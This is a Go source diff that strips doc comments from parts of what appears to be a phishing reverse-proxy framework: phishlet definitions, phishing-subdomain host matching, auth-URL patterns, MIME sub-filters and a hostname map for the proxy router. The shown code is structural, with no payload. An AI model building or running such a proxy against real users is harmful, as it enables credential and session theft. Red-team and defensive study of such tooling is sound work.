@@ -36,7 +36,6 @@ type PhishletDef struct {
 	AuthURLs    []*regexp.Regexp
 }
 
-// MatchesHost returns true if hostname corresponds to any of this phishlet's proxy hosts.
 func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
 	for _, host := range p.ProxyHosts {
 		if hostname == host.PhishSubdomain+"."+baseDomain {
@@ -46,7 +45,6 @@ func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
 	return false
 }
 
-// FindLanding returns the ProxyHost marked is_landing, or nil.
 func (p *PhishletDef) FindLanding() *ProxyHost {
 	for i := range p.ProxyHosts {
 		if p.ProxyHosts[i].IsLanding {
@@ -56,7 +54,6 @@ func (p *PhishletDef) FindLanding() *ProxyHost {
 	return nil
 }
 
-// MatchesAuthURL returns true if rawURL matches any auth_url pattern.
 func (p *PhishletDef) MatchesAuthURL(rawURL string) bool {
 	for _, authURL := range p.AuthURLs {
 		if authURL.MatchString(rawURL) {
@@ -105,7 +102,6 @@ type SubFilter struct {
 	WithParams []string
 }
 
-// MatchesMIME returns true if this filter applies to the given MIME type.
 func (s *SubFilter) MatchesMIME(mimeType string) bool {
 	for _, mime := range s.MimeTypes {
 		if strings.HasPrefix(mimeType, mime) {
@@ -206,7 +202,6 @@ func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService) *Phi
 	return &PhishletService{store: store, bus: bus, dns: dns}
 }
 
-// GetActiveHostnames returns a snapshot of hostname → phishlet name for the proxy router.
 func (s *PhishletService) GetActiveHostnames() map[string]string {
 	out := make(map[string]string)
 	s.activeHostnames.Range(func(key, val any) bool {
